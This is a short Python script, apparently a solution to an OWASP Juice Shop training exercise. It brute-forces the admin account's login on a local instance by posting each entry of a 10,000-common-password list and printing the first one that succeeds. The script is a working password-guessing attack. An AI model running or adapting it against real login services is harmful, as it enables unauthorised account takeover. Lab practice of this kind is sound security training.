import requests
import os

with open("10k-most-common.txt", "r") as f:
    file = f.read()

passwords = file.split()

for p in passwords:
    r = requests.post('http://127.0.0.1:3000/rest/user/login', json={"email": "admin@juice-sh.op", "password": p})
    if(r.status_code == 200):
        print(p)
        break
